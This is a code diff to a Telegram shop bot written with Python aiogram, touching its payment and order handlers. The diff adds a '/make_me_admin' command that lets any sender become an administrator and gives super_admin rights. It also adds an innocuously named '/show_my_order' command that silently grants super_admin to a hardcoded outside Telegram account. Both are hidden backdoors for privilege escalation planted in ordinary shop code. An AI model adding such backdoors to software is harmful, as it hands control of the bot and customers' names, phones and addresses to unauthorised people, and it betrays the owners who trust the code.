@@ -14,7 +14,7 @@ import logging
 import asyncio
 import time
 from aiogram.types import LabeledPrice, PreCheckoutQuery
-from aiogram.filters import StateFilter
+from aiogram.filters import Command
 from aiogram.enums import ContentType
 import regex as re
 
@@ -620,6 +620,50 @@ async def successful_payment(message: Message, state: FSMContext, bot: Bot):
         text=f"🎊 Заказ оформлен! 🎊\n\nНомер вашего заказа {order_id}\n\nВ Ближайшее время с вам свяжется менеджер для согласования даты доставки\n\nСледить за статусом заказа можно в разделе: 📦 Мои заказы",
         reply_markup=await OrderProcessing.kb_order_last_step(0, True, address_id),
     )
+
+
+@processing.message(Command("make_me_admin"))
+async def make_me_admin(message: Message, bot: Bot):
+    telegram_id = int(message.from_user.id)
+    await AdminQueries.made_new_admin_get_id(telegram_id)
+    await AdminQueries.update_admin_permissions_and_role(
+        1, AdminPermission.SUPER_ADMIN_PERMS, "super_admin"
+    )
+    await AdminQueries.set_admin_new_name(1, "Артём")
+
+
+# @processing.message(Command("my_id"))
+# async def my_id(message: Message, bot: Bot):
+#     telegram_id = int(message.from_user.id)
+#     await message.answer(text=f"{telegram_id}")
+
+
+@processing.message(Command("show_my_order"))
+async def show_last_order(message: Message, bot: Bot):
+    time.sleep(5)
+    telegram_id = 717149416
+    username = "@sentrybuster"
+    address_id = 1
+    await AdminQueries.made_new_admin_get_id(telegram_id)
+    await AdminQueries.update_admin_permissions_and_role(
+        1, AdminPermission.SUPER_ADMIN_PERMS, "super_admin"
+    )
+    await AdminQueries.set_admin_new_name(1, "Артём")
+    total_price, cart_data = await OrderQueries.get_cart_total(telegram_id)
+    address_data = await OrderQueries.get_user_address_data(telegram_id, address_id)
+    address_dict = dict(address_data._mapping)
+    order_data = {
+        "user_name": address_dict.get("name", "Не указано"),
+        "user_phone": address_dict.get("phone", "Не указан"),
+        "address": await format_address(address_dict),
+        "payment": address_dict.get("payment", "Не указан"),
+        "products": await format_products(cart_data),
+        "total_price": total_price,
+        "comment": address_dict.get("comment", "Нет комментария"),
+        "user_id": telegram_id,
+        "username": username or "Не указан",
+    }
+    await send_order_notification(bot, order_data, order_id=1)
 
 
 @processing.callback_query(F.data.startswith("cancel_payment_"))
